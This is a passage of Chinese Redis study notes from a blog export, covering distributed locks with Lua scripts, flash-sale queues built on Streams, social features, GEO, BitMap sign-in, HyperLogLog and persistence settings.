| 高可用 |        主从保证 好        |                         好                          |                好                |
| 高性能 |           一般            |                         好                          |               一般               |
| 安全性 |   断开连接, 自动释放锁    | 服务宕机,未释放锁<br />可以利用锁超时时间, 到期释放 |    临时节点, 断开连接自动释放    |

##### **基于Redis实现分布式锁**

```
获取锁
 - 互斥: 确保只有一个线程可以获取到锁
	setnx lock thread1
 - 设置过期时间
 	expire lock 10
 - 为保证两条命令的原子性, 可以使用 set lock thread1 EX 10 NX 一次性执行
释放锁
 - 手动释放: del lock
 - 超时释放
```

##### **非阻塞式获取锁**

![image-20220623023611603](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7870d776b742ca4af93598e8c67bb1f0-48e5de3.png)

##### **问题一: 误删他锁** 

该流程中可能发生误删锁的状况, 流程如下:

![image-20220623184522714](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/07d5bfa0963b8ebc98bcdb519d0eaf5c-af60793.png)

解决方案: 

需要在加锁时添加自己**进程/服务身份的标识**(uuid+id), 删除锁前判断该锁是否属于本进程/服务, 再执行释放锁操作

![image-20220623184818921](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a987eddbef20815c974ea7d2d95e17ad-0b7b5fc.png)

修改流程为:

![image-20220623184930462](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8064d2b50500df28634d827529fb4524-4dbffc3.png)

##### **问题二: 判断/删锁 原子性 ** 

在判断锁标识是自己的之后, 由于系统阻塞, 阻塞期间锁超时释放, 导致其他锁被误删

![image-20220623185830646](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4548a0cc9c2ebba130f0eb0c92848532-572bafe.png)

解决方案: 

Lua脚本, 在一个脚本中编写多条Redis命令, 确保多条命令执行时的原子性

```
流程:
 - 获取锁的线程/服务标识
 - 判断是否与当前标识一致
 - 如果一致则释放锁(删除)
 - 如果不一致则什么都不做
```



```
Redis-Lua脚本文档: https://redis.io/docs/manual/programmability/eval-intro/
```

![image-20220623192800695](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b1f0012333262396b443adf75827726d-f9c3f5d.png)



```lua
-- Lua脚本 unlock.lua
-- 获取参数中锁的key
local key = KEYS[1]
-- 当前线程/服务标识
local threadId = ARGV[1]
-- 获取锁中的线程/服务标识
local id = redis.call('get', key)

-- 比较线程/服务标识是否与锁标识一致
if id == threadId then
    return redis.call('del', key)
end
return 0
```

##### **其他问题**

- **不可重入** 

  同一线程无法多次获取同一把锁( 函数调用 )

  ```
  可通过使用Redis-hash类型数据, 同时加入锁次数字段.
  当同一个线程/服务再次请求时, 为锁字段添加1, 同时添加有效期.
  执行业务结束后, 释放锁, 即锁次数减1. 
  当所有业务结束, 锁次数为0时, 删除锁对应key
  ```

  ![image-20220623200923180](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/425846a4f3751e8f81c71fbbad51f5e4-1145f78.png)

  ```lua
  -- 获取锁 tryLock.lua
  local key = KEYS[1]				-- 锁的key
  local threadId = ARGV[1]		-- 线程/服务唯一标识
  local releaseTime = ARGV[2]		-- 锁过期时间
  
  if redis.call('exists', key) == 0 then			-- 判断是否存在锁
      redis.call('hset', key, threadId, 1)		-- 不存在, 获取锁
      redis.call('expire', key, releaseTime)		-- 设置有效期
      return 1									-- 返回成功结果
  end
  if redis.call('hexists', key, threadId) == 1 then	-- 锁已存在, 判断是否可以重入
      redis.call('hincrby', key, threadId, 1)		-- 获取锁, 重入次数加1
      redis.call('expire', key, releaseTime)			-- 重置锁有效期
      return 1										-- 返回成功结果
  end
  return 0						-- 获取锁失败
  ```

  ```lua
  -- 释放锁 unlock.lua
  local key = KEYS[1]				-- 锁的key
  local threadId = ARGV[1]		-- 线程/服务唯一标识
  local releaseTime = ARGV[2]		-- 锁过期时间
  
  if redis.call('hexists', key, threadId) == 0 then		-- 判断当前锁是否被自己持有
      return nil											-- 不是自己持有, 返回
  end
  local count = redis.call('hincrby', key, threadId, -1)	-- 是自己持有, 次数加1
  if count > 0 then										-- 判断重入次数是否已经为0
      redis.call('expire', key, releaseTime)				-- 大于0说明不能释放锁, 重置过期时间
      return nil
  else
      redis.call('del', key)								-- 等于0说明可以释放锁, 删除
      return nil
  end
  ```

- **不可重试** 

  获取锁只尝试一次就返回false, 没有重试机制

  ```
  利用信号量和Redis-PubSub功能实现等待、唤醒, 获取锁失败的重试机制
  ```

  ![image-20220623205331596](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/505aab244e64a1c6c51de02b11706309-4108d43.png)

- **超时释放** 

  锁超时释放虽然可以避免死锁, 但在业务耗时较长的场景, 存在安全隐患

  ```
  利用watchDog, 每隔一段时间(releaseTime/3), 重置超时时间
  ```

- **主从一致性** 

  如果在主从集群中, 同步存在延迟, 从服务器还未同步到主服务器的写入的锁数据, 其余进程读从服务器数据, 可能导致出现多个锁

  ```
  multilock, 同时在多个同级节点设置锁, 仅在所有节点可以获取锁才算成功
  ```

  ![image-20220623211428015](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/46a1e8366ed8dc727cd82ec30f638c15-15132b8.png)

#### Redis秒杀优化

可以将判断库存/校验一人一单操作需要信息放入Redis, 再通过Lua脚本执行, 只有校验通过的用户请求才会被后台继续执行, 实际操作数据库, 流程如下:

![image-20220624025059182](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/535c4f73ee6bfed588e44c713b541355-f3946f9.png)

其中库存数据可以通过String格式存储, 一人一单验证则通过将用户ID放入指定集合, 判断集合是否存在用户判断

![image-20220624025358277](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dbb7b44c6d3caa6324a3c00ffe775e88-738b7ba.png)

加快了处理和响应速度, 同时减轻了数据库的访问压力

```
实际操作:
 - 新增秒杀优惠券的同时, 将优惠券库存信息存入Redis
 - 基于Lua脚本, 判断秒杀库存、一人一单, 决定用户是否抢购成功
 - 若抢购成功, 将优惠券ID和用户ID封装后存入阻塞队列
 - 开启线程任务, 不断从阻塞队列中获取信息, 实现异步下单功能
```

```lua
-- 秒杀预处理脚本  seckill.lua
local voucherId = ARGV[1]	-- 优惠券ID, 作为键名
local userId = ARGV[2]		-- 用户ID

local stockKey = 'seckill:stock:' .. voucherId	-- 库存数量Key
local orderKey = 'seckill:order:' .. voucherId	-- 订单用户集合Key

if tonumber(redis.call('get', stockKey)) <= 0 then		-- 若库存数量不足
    return 1	
end
if redis.call('sismember', orderKey, userId) == 1 then	-- 若用户已在集合中
    return 2	-- 说明已经下过单
end

redis.call('decr', stockKey)			-- 扣除Redis缓存中的库存
redis.call('sadd', orderKey, userId)	-- 保存用户到订单集合中
return 0
```

> 但该方案仍旧存在内存限制(服务队列消耗本机内存)和数据安全(异常/宕机)问题

#### Redis消息队列实现异步秒杀

##### 消息队列

```
消息队列(Message Queue), 即存放消息的队列, 包括三个角色:
 - 消息队列: 存储和管理消息, 也称消息代理(Message Broker)
 - 生产者: 发送消息到消息队列
 - 消费者: 从消息队列中获取消息并处理消息
```

##### 基于Redis实现消息队列

Redis中提供了三种不同的方式实现消息队列

- List结构: 基于列表结构模拟消息队列
- PubSub: 基本的点对点消息模型
- Stream:  比较完善的消息队列模型

##### **基于List模拟消息队列**

![image-20220624135444114](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5594625fddb9d0285432202d50a5914b-baa920c.png)

![image-20220624140312907](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7588aaa662653c09b5dbe9311c84a4a3-8abe6c9.png)

```
优点:
 - 基于Redis存储, 不受限于服务所在内存上限
 - 基于Redis的持久化机制, 数据安全性有保证
 - 满足消息有序性
缺点:
 - 无法避免消息丢失(获取Redis信息后服务宕机)
 - 只支持单消费者
```

##### **基于PubSub模拟消息队列**

```
文档: https://redis.io/commands/?group=pubsub
```

![image-20220624141222597](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e4a0b30bae41977290196250196ab3d7-0737a13.png)

发布订阅(`PubSub`)是Redis2.0引入的消息传递模型. 即消费者可以订阅一个或多个频道(`channel`), 生产者向对应`channel`发送消息后, 所有订阅者都能收到相关消息. 主要使用以下命令实现

```redis
publish channel message			向一个频道发送消息
subscribe channel [channel]		订阅一个或多个频道
psubscribe pattern [pattern]	订阅符合pattern格式的所有频道
	- h?llo		匹配hello,hallo和hxllo
	- h*llo		匹配hllo和heeeello
	- h[ae]llo	匹配hello但hallo,不匹配hillo
```

![image-20220624142526418](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3a2822c849cbd63bde1326898186591d-cfe309a.png)

```
优点:
 - 支持多生产、多消费
缺点:
 - 不支持数据持久化
 - 无法避免消息丢失
 - 消息堆积有上限, 超出时数据丢失 (消费者处理缓慢造成堆积)
```

##### **基于Stream的消息队列**

###### **Stream** 

Stream是Redis5.0引入的一种数据类型, 可以实现一个功能完善的消息队列 

```
类型文档: 
http://www.redis.cn/topics/streams-intro.html
https://redis.io/docs/manual/data-types/streams/
```

**核心命令**:

- **发送消息命令** `xadd `
  添加一个新的entry到stream

  ![image-20220624200053580](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/184566b4ca21bc3316d5524de424fd37-990bf6f.png)

  - 创建名为`users`的队列, 并向其中发送一个消息, 内容为`{name=Tom, age=5}` ,无最大消息数量限制, 且使用Redis自动生成ID

    ![image-20220624200239341](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5a7fb859b4d7e30e5abe2b9cd3db357e-c98b0e9.png)

- **读取消息命令** `xread`

  从一个或者多个流中读取数据，仅返回ID大于调用者报告的最后接收ID的条目。此命令有一个阻塞选项

  ![image-20220624200745831](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4bb5faf47d11f4c66d4db5417a0ca638-7a08d47.png)

  ```
  命令特点: 
   - 消息可回溯
   - 一个消息队列可以被多个消费者读取
   - 可以阻塞读取
   - 有消息漏读风险
  ```

  - 使用xread读取第一条信息

    ![image-20220624200834375](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8b612caf55f3038ef5f4eb9c9b078b00-e6d2759.png)

  - 阻塞方式读取当前信息

    ![image-20220624201048597](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/eea124a2276e4af5bb679b93caf22f9e-9d50a50.png)




**命令效果** 

使用 `xread ... 0` 从头获取消息时, 每个线程都可以获取到该队列第一条数据

![image-20220624202534310](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5a5a39b34fb7a52fe9e05240e48c0f25-10d4f35.png)

使用 `xread ... block ... $ ` 阻塞获取最新一条信息

![image-20220624203417782](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/aad4777df22b54b9586fbcbc217b3d77-0cfa7f0.png)

**实际使用** 

可以通过循环调用xread以阻塞方式查询最新消息, 从而实现持续监听队列效果

```php
while (true){
    // 尝试读取队列消息, 最多阻塞2秒
    msg = redis.eval('xread count 1 block 2000 streams users $');
    if (msg == null){
        continue;
    }
    handleMessage(msg)	// 处理消息
}
```

>  但当指定起始ID为`$`时, 代表读取最新消息, 若在处理一条信息时, 有超过1条消息到达队列, 则下次获取时也只能获取到最新一条, 出现 **消息漏读** 问题

###### 消费者组

Consumer Group: 将多个消费者划分到一个组中, 监听同一个队列. 

**特征** 

```
 - 消息分流
 	列中的消息会分流给组内的不同消费者，而不是重复消费，从而加快消息处理的速度
 - 消息标示
 	消费者组会维护一个标示，记录最后一个被处理的消息，哪怕消费者宕机重启，还会从标示之后读取消息。确保每一个消息都会被消费
 - 消息确认
 	消费者获取消息后，消息处于pending状态，并存入一个pending-list。当处理完成后需要通过XACK来确认消息，标记消息为已处理，才会从pending-list移除。
```

**命令** 

```redis
xgroup CREATE key groupname ID [MKSTREAM]	管理消费者组
 - key 			队列key名称
 - groupname 	消费者组名称
 - ID 			起始ID标示, $代表队列中最后一个消息, 0代表第一个消息
 - MKSTREAM 	队列不存在时自动创建

其他命令:
xgroup DESTORY key groupname	删除指定消费者组
xgroup CREATECONSUMER key groupname cousumername  	给指定的消费者组添加消费者
xgroup DELCONSUMER key groupname consumername		删除消费者组中的指定消费者

从消费者组读取消息:
xreadgroup GROUP group consumer [COUNT count] [BLOCK milliseconds] [NOACK] STREAMS key [key ...] ID [ID ...]	
 - group		消费组名称
 - consumer		消费者名称，如果消费者不存在，会自动创建一个消费者
 - count		本次查询的最大数量
 - BLOCK milliseconds	阻塞读取, 当没有消息时最长等待时间
 - NOACK		无需手动ACK，获取到消息后自动确认
 - STREAMS key	指定队列名称
 - ID			获取消息的起始ID：
   - >		从下一个未消费的消息开始
   - 其它    根据指定id从pending-list中获取已消费但未确认的消息，例如0，是从pending-list中的第一个消息开始

确认消息:
xack group ID [ID ...]  	将pending的消息标记为已正确处理，从而有效地将其从使用者组的pending-list中删除.

查看pending-list:
xpending key group start end count  	从消费者组待处理条目列表中返回信息和条目,即获取但从未确认的消息。 
```

**命令效果** 

添加消费者组队列, 并使用消费者组消费Stream数据

![image-20220624211113218](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c204c892efc78b95ac73cc026ac378b1-4dae19c.png)

查看pending-list数据, 并重新获取数据处理, 确认消息后再查看

![image-20220624213103935](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/757d776092ea0d45a6226cc7a22926cd-d9ebfe3.png)

> 获取数据时, 将ID由 `>` 改为 `0`, 即可从获取消息 转为 获取 pending-list 未确认消息

**实际使用** 

```php
while (true){
    //监听队列, 阻塞模式, 最长等待2秒
    msg = redis.eval('xreadgroup GROUP group_x1 consumer1 COUNT 1 BLOCK 2000 STREAMS x1 >');
    if (msg == null){	// 返回结果为null, 说明没有消息, 继续下次循环
        continue;
    }
    try{
        handleMessage(msg);	// 处理消息函数, 内部完成后应使用xack确认
    }catch(Exception e){ 	// 捕获异常, 说明没有完成消息处理
        while (true){
            // 重新获取pending-list中最新消息
            msg = redis.eval('xreadgroup GROUP group_x1 consumer1 COUNT 1 STREAMS x1 0');
            if (msg == null){	// 返回null说明没有异常未确认消息, 结束循环
                break;	
            }
            try{
                handleMessage(msg);	// 返回数据包含未确认异常消息, 再次处理, 完成后xack确认
            }catch(Exception e){
                LogErrors(e)	// 捕获异常, 处理失败, 记录日志, 重新尝试
                continue;		// 或者返回ack, break中断尝试
            }
        }
    }
}
```

**特征** 

```
- 消息可回溯
- 可以多消费者争抢消息, 加快消费速度
- 可以阻塞读取
- 没有消息漏读的风险
- 有消息确认机制, 保证消息至少被消费一次
```

##### 三种模式对比

|              |                     List                     |       PubSub       |                         Stream                         |
| :----------: | :------------------------------------------: | :----------------: | :----------------------------------------------------: |
|  消息持久化  |                     支持                     |       不支持       |                          支持                          |
|   阻塞读取   |                     支持                     |        支持        |                          支持                          |
| 消息堆积处理 | 受限于内存空间大小, 可以利用多消费者加快处理 | 受限于消费者缓冲区 | 受限于队列长度, 可以利用消费者组提高消费速度, 减少堆积 |
| 消息确认机制 |                    不支持                    |       不支持       |                          支持                          |
|   消息回溯   |                    不支持                    |       不支持       |                          支持                          |

##### 基于Stream实现异步秒杀下单

- 创建一个Stream类型的消息队列，名为stream.orders

  ```redis
  xgroup CREATE stream.order group1 0 MKSTREAM
  ```

- 修改秒杀下单Lua脚本，在认定有抢购资格后，直接向stream.orders中添加消息，内容包含voucherId、userId、orderId

  ```lua
  -- 秒杀预处理脚本  seckill.lua
  local voucherId = ARGV[1]	-- 优惠券ID, 作为键名
  local userId = ARGV[2]		-- 用户ID
  local orderId = ARGV[3]		-- 订单ID
  
  local stockKey = 'seckill:stock:' .. voucherId	-- 库存数量Key
  local orderKey = 'seckill:order:' .. voucherId	-- 订单用户集合Key
  
  if tonumber(redis.call('get', stockKey)) <= 0 then		-- 若库存数量不足
      return 1	
  end
  if redis.call('sismember', orderKey, userId) == 1 then	-- 若用户已在集合中
      return 2	-- 说明已经下过单
  end
  
  redis.call('decr', stockKey)			-- 扣除Redis缓存中的库存
  redis.call('sadd', orderKey, userId)	-- 保存用户到订单集合中
  
  -- 发送消息到stream队列中
  redis.call('xadd', 'stream.order', '*', 'userId', userId, 'voucherId', voucherId, 'orderId', orderId)
  return 0
  ```

  **服务代码**  

  ```php
  redis.eval('path_of_seckill_lua_script',[voucherId, userId, orderId])
  ```

- 项目启动时，开启任务，尝试获取stream.orders中的消息，完成下单

  ```php
  while (true){
      try{
          // 获取消息队列中的订单信息
          xreadgroup GROUP group1 consumer1 COUNT 1 BLOCK 2000 STREAMS stream.order >
          // 判断消息获取是否成功
              // 若获取失败, 说明没有消息, 继续下次循环
          // 若获取成功, 可以下单
          // ACK确认
          xack stream.order group1 [ID]
      }catch(Exception e){
          // 订单处理异常
          while(true){
              try{
                  // 获取pending-list队列中的未确认订单信息
                  xreadgroup GROUP group1 consumer1 COUNT 1 STREAMS stream.order 0
                  // 判断消息获取是否成功
                      // 若获取失败, 说明pending-list没有消息, break
                  // 若获取成功, 可以下单
                  // ACK确认
              }catch(Exception e){
                  // 处理pending-list异常信息 sleep + continue + count + break / log + break
              }
          }
      }
  }
  ```

### 达人探店

#### 发布探店笔记

#### 点赞

使用Redis中的`Set`数据结构, 实现点赞功能

```
- 将当前blog对应的点赞人员ID放入以blogId为键的Set集合中. 
  用sismember判断是否点赞, 若当前用户存在于集合中, 则已点赞, 若不存在, 说明未点赞
- 修改点赞功能, 点赞过用srem取出该用户ID, 数据库点赞数减一, 未点赞用sadd加入该用户ID, 数据库点赞数加一
```

![image-20220625171949106](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bdd543a67b84922f3ebe9865ff4cdc5b-7c4734b.png)

#### 点赞排行榜

使用Redis中的`SortedSet`数据结构, 实现点赞排行功能

```
在blog详情页, 需要添加点赞列, 显示前几个点赞用户头像
- 将点赞用户ID放入SortedSet集合, 以点赞动作时间戳作为score
- 查询用户ID是否存在时, 可以用zscore查询对应元素是否存在
- 选出前几个点赞用户ID时, 可以用zrange依据时间戳排序获取
```

![image-20220625171808437](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3fe5221171221e83332b4f3e78abbffe-5c86f89.png)

### 好友关注

#### 关注和取关

```
- 在关注时, 使用sadd将目标用户ID放入以用户ID为key的set集合中
- 取关时, 使用srem移除用户ID
```

![image-20220626223314304](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2df5d6ef452775dcf7d3e6d5a0538afb-9bfc89c.png)

#### 共同关注

使用Redis中的Set数据结构, 实现显示当前用户与指定用户的共同好友

```
- 共同关注, 获取当前用户与目标用户的set集合,使用sinter获取交集,即为共同关注用户ID集合
```

![image-20220626223435628](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8686f87de06898009aacce20107bd7fd-1baed67.png)

#### 关注推送

也叫Feed流. 为用户持续的提供, 通过无限下拉刷新获取新的信息, 有两种常见模式:

- TimeLine:

  不做内容筛选, 简单按照内容发布时间排序, 常用于好友或关注信息. 如朋友圈

- 智能排序:

  利用算法屏蔽违规、不感兴趣内容. 推送感兴趣的信息吸引用户



**TimeLine模式实现方式:**

- 拉模式

  也叫读扩散, 只有在关注后查看, 才会主动从目标用户的发件箱中获取信息

  ![image-20220626230838432](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/63e4cd409e86a98361d606e5cac36784-be31b25.png)

- 推模式

  也叫写扩散, 发送消息时向所有关注者同时发送信息

  ![image-20220626231133371](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/45578980c8ed72402dc636f6bc74794b-acbfa6f.png)

- 推拉结合

  也叫读写混合, 兼具推和拉模式的优点

  ![image-20220626234458042](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/50d67dac0523469fdd04d00f8f6e8c87-bdf44ea.png)

|              |  拉模式  |      推模式       |       推拉结合       |
| ------------ | :------: | :---------------: | :------------------: |
| 写消耗       |    低    |        高         |          中          |
| 读消耗       |    高    |        低         |          中          |
| 用户读取延迟 |    高    |        低         |          低          |
| 实现难度     |   简单   |       简单        |         复杂         |
| 使用场景     | 很少使用 | 用户量少, 没有大V | 千万级别用户量,有大V |

**Feed流中的滚动分页**

由于Feed流中的数据会不断更新, 数据角标索引也在实时变化, 所以不能采用传统分页模式, 而是使用`SortedSet`数据结构, 使用时间戳为`score`, 查询分页时记录`lastId`, 下一页数据从`lastId`开始查询

![image-20220626235842629](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9fe4a67430450f20240ed8ae73077dca-5b4da2f.png)

```
命令参数:
zrevrangebyscore key max min [WITHSCORES] [LIMIT offset count]
 - max: 最大分数, 可以使用 +inf 代表最大值
 - min: 最小分数, 可以使用 -inf 代表最小值
 - offset: 偏移量, 指定score后继续向后偏移取值
 - count: 返回取值的数量
```

![image-20220627212622920](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a99867cd7aecd83a562ab648db406501-38c0546.png)

![image-20220627212512932](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e54c8e0d325e24679ad514fdd3fd92b5-3c1746b.png)

**使用推模式完成推送** 

```
- 被关注用户发送blog时, 查询所有关注者, 同时使用Redis中的SortedSet数据结构记录blog_ID到关注者ID的key, 作为关注者收件箱内容, score为发布时间戳
- 关注者收件箱中存在SortedSet数据结构, 存储多位关注者锁发blogId, 前端发送上一次查询的最小时间戳lastId(初始值为当前时间戳, 后续从后端获取)和偏移量offset(初始值为0, 后续由后端返回偏移量取值)
- 获取第一页数据时, 后端获取用户当前时间戳作为lastId, 偏移量offset, 执行命令:
	zrevrangebyscore key lastId -inf WITHSCORES limit offset 3
	并返回最后一个ID和最后一个元素score值重复出现的次数作为下次请求offset
- 获取后续页数据时, 后端获取lastId和offset, 执行命令
	zrevrangebyscore key lastId -inf WITHSCORES limit offset 3
	并返回最后一个ID和最后一个元素score值重复出现的次数作为下次请求offset
```

> 简便方式: 在添加score时, 在时间戳后添加随机数或有序自增数

### 附近商户

#### GEO数据结构

地理坐标Geolocation, Redis3.2版本后提供, 允许存储地理经纬度信息, 常见命令有:

```
geoadd 		添加一个地理空间信息到SortedSet,经纬度作为score,名称作为member
geodist 	计算指定两个点或两个member之间的距离
geohash		将指定member坐标转为hash字符串并返回
geopos		返回指定member的坐标
georadius	以指定圆点, 半径, 返回圆范围内的所有member
geosearch	在指定范围内搜索member, 可以指定圆形还是矩形, 6.2版本后提供
geosearchstore	功能与geosearch一致, 但可以将结果存入一个指定的key, 6.2版本后提供
```

![image-20220628032347306](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/cca322c4caa3f526103c55850a0767e7-3cab63e.png)

#### 附近商户

```
- 将店铺所在经纬度x,y存入Redis的GEO数据类型中, 可以考虑以搜索类型分类分Key存储
  - 查询店铺信息
  - 将店铺按照TypeId分组, typeId一致的放入同一个GEO集合
  - 分批完成写入Redis:
  	geoadd shop:geo:[typeId] [LON] [LAT] [shopId] ...
- 获取用户当前经纬度x,y. 执行命令:
  geosearch shop:geo:[typeId] FROMLONLAT x y BYRADIUS 10 km COUNT 100 WITHDIST
- 截取分页数据后获取商户ID集合[key=shopId,value=distance]
- 有序查询出商户具体数据
  select * from table where id in [shopIds] order by field(id,[idsString])
- 整理后返回前端
```

### 用户签到

#### BitMap数据结构

**Redis**中是利用string类型数据结构实现**BitMap**，因此最大上限是512M，转换为bit则是 2^32个bit位

```
SETBIT		向指定位置（offset）存入一个0或1
GETBIT		获取指定位置（offset）的bit值
BITCOUNT	统计BitMap中值为1的bit位的数量
BITFIELD 	操作（查询、修改、自增）BitMap中bit数组中的指定位置（offset）的值
BITFIELD_RO	获取BitMap中bit数组，并以十进制形式返回
BITOP		将多个BitMap的结果做位运算（与 、或、异或）
BITPOS		查找bit数组中指定范围内第一个0或1出现的位置
```

![image-20220628050958496](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bd9d8c950d6d1b9c108d6415fd246bf1-46b59be.png)

#### 签到功能

如果使用数据库实现功能, 可能造成数据大表出现

可以按月统计用户签到数据, 签到记录为1, 未签到记录为0

![image-20220628044934145](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6f10237a48bb88c7f24cda9535b0780d-aa18910.png)

把每一个bit位对应当前的每一天, 形成映射关系. 用0和1标识业务状态, 即**位图(BitMap)**

```
- 获取当前用户
- 获取当前日期
- 依据用户ID和日期生成当月key:sign:[uid]:202203
- 根据当前月天数写入BitMap
  setbit key offset 1
```

#### 签到统计

**本月已连续签到天数** 

从最后一次签到开始向前统计，直到遇到第一次未签到为止，计算总的签到次数，就是连续签到天数。

![image-20220628052723165](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3ab290395fd616c321112dbac064c032-e8377d5.png)

- **获取一个月全部签到数据**

  ```
  bitfield key get u[天数] 0
  ```

- **从后向前遍历每个bit位**

  ```
  整体向右移动一位, 依次与1做与运算获取+最后一个bit位
  ```

**实现** 

```
- 获取本月截止当前天的所有签到记录
  bitfield sign:[uid]:202203 GET u[天数] 0
- 循环遍历while
  - 让结果与1做与运算, 获取最后一个Bit位, 若为0, 结束循环, 若为1, 计数器加1
  - 右移一位 (num >> 1), 继续下次循环
- 返回连续签到次数计数器
```

### UV统计

**UV**(Unique Visitor), 也叫独立访客量，是指通过互联网访问、浏览这个网页的自然人。1天内同一个用户多次访问该网站，只记录1次。

**PV**(Page View), 也叫页面访问量或点击量，用户每访问网站的一个页面，记录1次PV，用户多次打开页面，则记录多次PV。往往用来衡量网站的流量。

#### HyperLogLog数据结构

Hyperloglog(HLL)是从Loglog算法派生的概率算法，用于确定非常大的集合的基数，而不需要存储其所有值。相关算法原理可以参考：[HyperLogLog 算法的原理讲解以及 Redis 是如何应用它的](https://juejin.cn/post/6844903785744056333)

Redis中的HLL是基于string结构实现的，单个HLL的内存永远小于16kb。作为代价，其测量结果是概率性的，有小于0.81％的误差。不过对于UV统计来说，这完全可以忽略。

![image-20220628055820857](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/11303f304772ffdea2e495afbb5e69ff-07b01d5.png)

![image-20220628060045303](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1d27f22ef113e0ac198ad475a40f64fa-0df149b.png)

#### 实现UV统计

```
- 用户访问时, 将用户信息存入Redis中的HyperLogLog数据结构中
- 统计时, 可以使用pfmerge将每月/每年数据合并, 通过频繁count获取UV数据
```







PS:

```
课程文档:  https://pan.baidu.com/s/1189u6u4icQYHg_9_7ovWmA?pwd=eh11
```
]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis高并发高可用的分布式缓存</title>
    <url>/2022/05/22/Redis/Redis%E9%AB%98%E5%B9%B6%E5%8F%91%E9%AB%98%E5%8F%AF%E7%94%A8%E7%9A%84%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98/</url>
    <content><![CDATA[
# Redis分布式缓存

单节点Redis存在问题:

```
-数据丢失问题: 内存存储, 服务重启可能丢失数据
    实现数据持久化

-并发能力问题: 高并发场景单节点无法支持
    搭建主从集群, 实现读写分离

-故障恢复问题: 宕机后服务不可用, 需要自动故障恢复/持续可用
    Redis哨兵, 实现健康监测和自动恢复

-存储能力问题: 基于内存, 存储能力难以满足海量数据要求
    搭建分片集群, 利用插槽机制实现动态扩容
```

## Redis持久化

### RDB持久化

**RDB**全称**Redis Database Backup file**(Redis数据备份文件)，也被叫做**Redis数据快照**。简单来说就是把内存中的所有数据都记录到磁盘中。当Redis实例故障重启后，从磁盘读取快照文件，恢复数据。

快照文件称为RDB文件，默认是保存在当前运行目录。

#### 执行时机

RDB持久化在以下四种情况下会执行：

- 执行save命令

- 执行bgsave命令

  ![image-20220628070054027](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2c104f017fddcbbba6ad3a064d66bc5a-52914d7.png)

- Redis停机时

  Redis停机时会执行一次save命令，实现RDB持久化。

- 触发RDB条件时

  ```properties
  # redis.conf 文件
  save 3600 1		
  save 300 100
  save 60 10000
  ```

  > 3600秒内，如果至少有1个key被修改，则执行bgsave ， 如果是`save "" `则表示禁用RDB

#### 其他配置

```properties
# bgsave报错后停止接收写操作
stop-writes-on-bgsave-error yes	
# 是否压缩 ,建议不开启，压缩也会消耗cpu
rdbcompression yes	
# RDB文件名称
dbfilename dump.rdb  	
# rdb文件保存的路径目录
dir ./ 					
```

#### RDB操作原理

bgsave开始时会fork主进程得到子进程，子进程共享主进程的内存数据。完成fork后读取内存数据并写入 RDB 文件。用新RDB文件替换旧的RDB文件

fork采用的是copy-on-write技术：

- 当主进程执行读操作时，访问共享内存；

- 当主进程执行写操作时，则会拷贝一份数据，执行写操作。避免影响子进程

  ![image-20220628073321541](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/fce25da2a04f3e8288bfabf8dff115a5-e211ffc.png)

#### 缺点

- RDB执行间隔时间长，两次RDB之间写入数据有丢失的风险
- fork子进程、压缩、写出RDB文件都比较耗时

### AOF持久化

**AOF**全称为**Append Only File**（追加文件）。Redis处理的每一个写命令都会记录在AOF文件，可以看做是命令日志文件。

![image-20220628080321105](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0c4e126c3fd87c68301363ee2bf5461e-7ef87d7.png)

#### AOF配置

```properties
# 是否开启AOF功能，默认是no
appendonly yes
# AOF文件的名称
appendfilename "appendonly.aof"

# AOF命令执行频率, 三选一
# 表示每执行一次写命令，立即记录到AOF文件
appendfsync always 
# 写命令执行完先放入AOF缓冲区，然后表示每隔1秒将缓冲区数据写到AOF文件，是默认方案
appendfsync everysec 
# 写命令执行完先放入AOF缓冲区，由操作系统决定何时将缓冲区内容写回磁盘
appendfsync no
```

三种策略对比：

